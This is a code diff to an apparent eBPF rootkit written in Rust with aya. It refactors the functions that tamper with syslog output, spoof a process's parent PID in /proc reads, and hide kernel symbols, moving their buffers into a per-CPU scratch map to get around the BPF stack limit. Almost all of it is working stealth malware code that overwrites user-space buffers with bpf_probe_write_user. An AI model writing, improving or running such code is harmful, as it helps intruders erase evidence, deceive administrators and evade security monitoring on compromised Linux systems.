@@ -8,7 +8,7 @@ use aya_ebpf::{
         bpf_probe_write_user,
     },
     macros::{kprobe, kretprobe, map, xdp},
-    maps::{HashMap, PerfEventArray},
+    maps::{HashMap, PerCpuArray, PerfEventArray},
     programs::{ProbeContext, RetProbeContext, XdpContext},
 };
 use common::{
@@ -112,6 +112,15 @@ struct VfsReadCtx {
 
 #[map]
 static VFS_READ_ARGS: HashMap<u64, VfsReadCtx> = HashMap::with_max_entries(1024, 0);
+
+/// Per-CPU scratch buffer for data scanning (avoids exceeding BPF 512-byte stack limit).
+#[repr(C)]
+struct ScratchBuf {
+    data: [u8; 4096],
+}
+
+#[map]
+static SCRATCH_BUF: PerCpuArray<ScratchBuf> = PerCpuArray::with_max_entries(1, 0);
 
 /// Temporary storage for do_syslog kprobe → kretprobe handoff.
 /// Key: pid_tgid (u64). Value: SyslogCtx { syslog_type, buf_ptr, len }.
@@ -735,10 +744,14 @@ fn try_tamper_logs(_ctx: &RetProbeContext) -> Result<u32, i64> {
         args.len as usize
     };
 
-    let mut buf: [u8; 2048] = [0u8; 2048];
+    let buf = unsafe {
+        let ptr = SCRATCH_BUF.get_ptr_mut(0).ok_or(1i64)?;
+        &mut *ptr
+    };
+
     unsafe {
         if aya_ebpf::helpers::gen::bpf_probe_read_user(
-            buf.as_mut_ptr() as *mut core::ffi::c_void,
+            buf.data.as_mut_ptr() as *mut core::ffi::c_void,
             scan_len as u32,
             args.buf_ptr as *const core::ffi::c_void,
         ) < 0
@@ -757,16 +770,16 @@ fn try_tamper_logs(_ctx: &RetProbeContext) -> Result<u32, i64> {
             break;
         }
 
-        if buf[i] == pattern[0]
-            && buf[i + 1] == pattern[1]
-            && buf[i + 2] == pattern[2]
-            && buf[i + 3] == pattern[3]
-            && buf[i + 4] == pattern[4]
-            && buf[i + 5] == pattern[5]
-            && buf[i + 6] == pattern[6]
+        if buf.data[i] == pattern[0]
+            && buf.data[i + 1] == pattern[1]
+            && buf.data[i + 2] == pattern[2]
+            && buf.data[i + 3] == pattern[3]
+            && buf.data[i + 4] == pattern[4]
+            && buf.data[i + 5] == pattern[5]
+            && buf.data[i + 6] == pattern[6]
         {
             let mut line_start = i;
-            while line_start > 0 && buf[line_start - 1] != b'\n' {
+            while line_start > 0 && buf.data[line_start - 1] != b'\n' {
                 line_start -= 1;
                 if line_start == 0 {
                     break;
@@ -774,7 +787,7 @@ fn try_tamper_logs(_ctx: &RetProbeContext) -> Result<u32, i64> {
             }
 
             let mut line_end = i + 7;
-            while line_end < scan_len && buf[line_end] != b'\n' {
+            while line_end < scan_len && buf.data[line_end] != b'\n' {
                 line_end += 1;
                 if line_end >= 2048 {
                     break;
@@ -783,7 +796,7 @@ fn try_tamper_logs(_ctx: &RetProbeContext) -> Result<u32, i64> {
 
             let mut j = line_start;
             while j < line_end && j < 2048 {
-                buf[j] = b' ';
+                buf.data[j] = b' ';
                 j += 1;
             }
 
@@ -792,7 +805,7 @@ fn try_tamper_logs(_ctx: &RetProbeContext) -> Result<u32, i64> {
                 unsafe {
                     let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
                         (args.buf_ptr + line_start as u64) as *mut core::ffi::c_void,
-                        buf[line_start..].as_ptr() as *const core::ffi::c_void,
+                        buf.data[line_start..].as_ptr() as *const core::ffi::c_void,
                         write_len,
                     );
                 }
@@ -844,10 +857,15 @@ fn try_spoof_ancestry(_ctx: &RetProbeContext) -> Result<u32, i64> {
     } else {
         args.count as usize
     };
-    let mut buf: [u8; 512] = [0u8; 512];
+
+    let buf = unsafe {
+        let ptr = SCRATCH_BUF.get_ptr_mut(0).ok_or(1i64)?;
+        &mut *ptr
+    };
+
     unsafe {
         if aya_ebpf::helpers::gen::bpf_probe_read_user(
-            buf.as_mut_ptr() as *mut core::ffi::c_void,
+            buf.data.as_mut_ptr() as *mut core::ffi::c_void,
             scan_len as u32,
             args.buf_ptr as *const core::ffi::c_void,
         ) < 0
@@ -867,12 +885,12 @@ fn try_spoof_ancestry(_ctx: &RetProbeContext) -> Result<u32, i64> {
         if i >= 506 {
             break;
         }
-        if buf[i] == ppid_pattern[0]
-            && buf[i + 1] == ppid_pattern[1]
-            && buf[i + 2] == ppid_pattern[2]
-            && buf[i + 3] == ppid_pattern[3]
-            && buf[i + 4] == ppid_pattern[4]
-            && buf[i + 5] == ppid_pattern[5]
+        if buf.data[i] == ppid_pattern[0]
+            && buf.data[i + 1] == ppid_pattern[1]
+            && buf.data[i + 2] == ppid_pattern[2]
+            && buf.data[i + 3] == ppid_pattern[3]
+            && buf.data[i + 4] == ppid_pattern[4]
+            && buf.data[i + 5] == ppid_pattern[5]
         {
             ppid_offset = i + 6;
             found = true;
@@ -892,16 +910,16 @@ fn try_spoof_ancestry(_ctx: &RetProbeContext) -> Result<u32, i64> {
         if j >= 507 {
             break;
         }
-        if buf[j] == pid_pattern[0]
-            && buf[j + 1] == pid_pattern[1]
-            && buf[j + 2] == pid_pattern[2]
-            && buf[j + 3] == pid_pattern[3]
-            && buf[j + 4] == pid_pattern[4]
-            && (j == 0 || buf[j - 1] == b'\n' || buf[j - 1] == b'\t')
+        if buf.data[j] == pid_pattern[0]
+            && buf.data[j + 1] == pid_pattern[1]
+            && buf.data[j + 2] == pid_pattern[2]
+            && buf.data[j + 3] == pid_pattern[3]
+            && buf.data[j + 4] == pid_pattern[4]
+            && (j == 0 || buf.data[j - 1] == b'\n' || buf.data[j - 1] == b'\t')
         {
             let mut k = j + 5;
-            while k < scan_len && k < 512 && buf[k] >= b'0' && buf[k] <= b'9' {
-                target_pid = target_pid * 10 + (buf[k] - b'0') as u32;
+            while k < scan_len && k < 512 && buf.data[k] >= b'0' && buf.data[k] <= b'9' {
+                target_pid = target_pid * 10 + (buf.data[k] - b'0') as u32;
                 k += 1;
             }
             break;
@@ -941,7 +959,7 @@ fn try_spoof_ancestry(_ctx: &RetProbeContext) -> Result<u32, i64> {
 
     let mut orig_len = 0usize;
     let mut m = ppid_offset;
-    while m < scan_len && m < 512 && buf[m] >= b'0' && buf[m] <= b'9' {
+    while m < scan_len && m < 512 && buf.data[m] >= b'0' && buf.data[m] <= b'9' {
         orig_len += 1;
         m += 1;
     }
@@ -1135,10 +1153,15 @@ fn try_hide_kallsyms(_ctx: &RetProbeContext) -> Result<u32, i64> {
     } else {
         args.count as usize
     };
-    let mut buf: [u8; 4096] = [0u8; 4096];
+
+    let buf = unsafe {
+        let ptr = SCRATCH_BUF.get_ptr_mut(0).ok_or(1i64)?;
+        &mut *ptr
+    };
+
     unsafe {
         if aya_ebpf::helpers::gen::bpf_probe_read_user(
-            buf.as_mut_ptr() as *mut core::ffi::c_void,
+            buf.data.as_mut_ptr() as *mut core::ffi::c_void,
             scan_len as u32,
             args.buf_ptr as *const core::ffi::c_void,
         ) < 0
@@ -1158,16 +1181,16 @@ fn try_hide_kallsyms(_ctx: &RetProbeContext) -> Result<u32, i64> {
             break;
         }
 
-        if buf[i] == pattern[0]
-            && buf[i + 1] == pattern[1]
-            && buf[i + 2] == pattern[2]
-            && buf[i + 3] == pattern[3]
-            && buf[i + 4] == pattern[4]
-            && buf[i + 5] == pattern[5]
-            && buf[i + 6] == pattern[6]
+        if buf.data[i] == pattern[0]
+            && buf.data[i + 1] == pattern[1]
+            && buf.data[i + 2] == pattern[2]
+            && buf.data[i + 3] == pattern[3]
+            && buf.data[i + 4] == pattern[4]
+            && buf.data[i + 5] == pattern[5]
+            && buf.data[i + 6] == pattern[6]
         {
             let mut line_start = i;
-            while line_start > 0 && buf[line_start - 1] != b'\n' {
+            while line_start > 0 && buf.data[line_start - 1] != b'\n' {
                 line_start -= 1;
                 if line_start == 0 {
                     break;
@@ -1175,13 +1198,13 @@ fn try_hide_kallsyms(_ctx: &RetProbeContext) -> Result<u32, i64> {
             }
 
             let mut line_end = i + 7;
-            while line_end < scan_len && line_end < 4096 && buf[line_end] != b'\n' {
+            while line_end < scan_len && line_end < 4096 && buf.data[line_end] != b'\n' {
                 line_end += 1;
             }
 
             let mut k = line_start;
             while k < line_end && k < 4096 {
-                buf[k] = b' ';
+                buf.data[k] = b' ';
                 k += 1;
             }
 
@@ -1201,7 +1224,7 @@ fn try_hide_kallsyms(_ctx: &RetProbeContext) -> Result<u32, i64> {
         unsafe {
             let _ = aya_ebpf::helpers::gen::bpf_probe_write_user(
                 args.buf_ptr as *mut core::ffi::c_void,
-                buf.as_ptr() as *const core::ffi::c_void,
+                buf.data.as_ptr() as *const core::ffi::c_void,
                 write_len,
             );
         }
